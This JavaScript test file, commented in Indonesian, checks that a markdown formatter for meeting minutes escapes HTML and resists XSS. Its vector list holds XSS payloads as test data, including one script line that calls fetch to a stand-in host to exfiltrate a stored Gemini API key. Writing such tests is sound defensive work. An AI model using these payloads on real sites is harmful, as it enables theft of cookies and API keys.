/**
 * Self-check keamanan render notulen (anti-XSS).
 * Jalankan: node tests/markdownInline.test.mjs
 */
import assert from 'node:assert/strict';
import { escapeHtml, formatMarkdownInline } from '../resources/js/lib/text/markdownInline.mjs';

// --- escapeHtml ---
assert.equal(escapeHtml('<&>"'), '&lt;&amp;&gt;&quot;');
assert.equal(escapeHtml("'"), '&#39;');
assert.equal(escapeHtml(''), '');
assert.equal(escapeHtml(null), '');

// --- markup yang sah tetap bekerja ---
assert.equal(formatMarkdownInline('**tebal**'), '<strong class="font-bold text-[var(--color-ink)]">tebal</strong>');
assert.ok(formatMarkdownInline('[Andi]: halo').includes('>[Andi]</span>'));
assert.equal(formatMarkdownInline('* halo'), 'halo');

// --- XSS: HTML dari transkrip TIDAK boleh jadi tag ---
// Invarian: setelah membuang tag yang KITA buat sendiri, tidak boleh ada
// karakter < atau > sama sekali. Semua HTML dari sumber harus sudah jadi entitas.
const TAG_BUATAN_SENDIRI = /<span class="[^"]*">|<\/span>|<strong class="[^"]*">|<\/strong>/g;

const vektor = [
  '* **[Andi]:** hasil <img src=x onerror=alert(document.cookie)>',
  '<script>fetch("//jahat.example?k="+localStorage.gemini_api_key)</script>',
  '<svg onload=alert(1)>',
  '**<iframe src="javascript:alert(1)"></iframe>**',
  '[<img src=x onerror=alert(1)>]',
  '<a href="javascript:alert(1)">klik</a>',
];

for (const jahat of vektor) {
  const sisa = formatMarkdownInline(jahat).replace(TAG_BUATAN_SENDIRI, '');
  assert.ok(!/[<>]/.test(sisa), `HTML mentah lolos: ${sisa}`);
}

// Vektor berisi entitas harus ter-escape, bukan tereksekusi
assert.ok(formatMarkdownInline('<img src=x>').includes('&lt;img'));

// Penanda markdown sendiri tidak boleh dipakai membuat tautan/atribut
assert.ok(!/href\s*=|src\s*=/i.test(formatMarkdownInline('[klik](javascript:alert(1))')));

console.log('markdownInline.mjs: semua assertion lolos');
